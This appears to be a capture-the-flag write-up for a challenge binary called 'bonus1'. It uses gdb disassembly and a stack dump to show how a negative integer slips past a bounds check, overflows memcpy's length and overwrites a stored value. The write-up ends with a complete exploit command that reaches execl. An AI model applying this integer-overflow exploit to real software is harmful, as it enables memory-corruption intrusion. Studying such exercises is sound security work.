The program is using two arguments, the first will be used to pass two checks, the second will be copied :

    gdb> disas main
    0x0804842a <+6>:	sub    esp,0x40                     # a 40 bytes long buffer
    0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048430 <+12>:	add    eax,0x4
    0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
    0x08048435 <+17>:	mov    DWORD PTR [esp],eax
    0x08048438 <+20>:	call   0x8048360 <atoi@plt>         # translated and stored as an Int at $esp+0x3c (a)
    0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
    0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9     # a is compared with 9
    0x08048446 <+34>:	jle    0x804844f <main+43>          # if less or equal to 9, jump to ┐
    0x08048448 <+36>:	mov    eax,0x1                                                       │
    0x0804844d <+41>:	jmp    0x80484a3 <main+127>                                          │
    0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]     <────────────────────────────────┘
    0x08048453 <+47>:	lea    ecx,[eax*4+0x0]              # a * 4 (b)
    0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]      # |
    0x0804845d <+57>:	add    eax,0x8                      # | Take second command-line argument
    0x08048460 <+60>:	mov    eax,DWORD PTR [eax]          # |
    0x08048462 <+62>:	mov    edx,eax                      # |
    0x08048464 <+64>:	lea    eax,[esp+0x14]
    0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx      # Use b as length for memcpy
    0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx      # Use second argument
    0x08048470 <+76>:	mov    DWORD PTR [esp],eax          # copy into the 40 bytes long buffer
    0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
    0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46      # if a != 0x574f4c46
    0x08048480 <+92>:	jne    0x804849e <main+122>                 # then exit
    0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
    0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
    0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
    0x08048499 <+117>:	call   0x8048350 <execl@plt>                # our target

The exploit here is that a very large negative number could pass first check (<=9) and also be used as a len to buffer overflow with memcpy (thanks to integer overflows)

We choose -1073741812. -1073741812 * 4 = 48.

Now we need to know where we should write :

    gdb> b *0x8048478 (after memcpy)
    gdb> r 9 AAAAAAAAAAAAAAAAAAAAA...
    gdb> x/100wx $esp
    0xbffff640:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
    0xbffff650:	0x41414141	0x41414141	0x41414141	0x41414141
    0xbffff660:	0x41414141	0x41414141	0x080484b9	0x00000009  # We see our 9 just 4 bytes after. 48 is perfect.

The payload :

[-1073741812]  [Ax40][0x574f4c46]

./bonus1 -1073741812 `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"'`
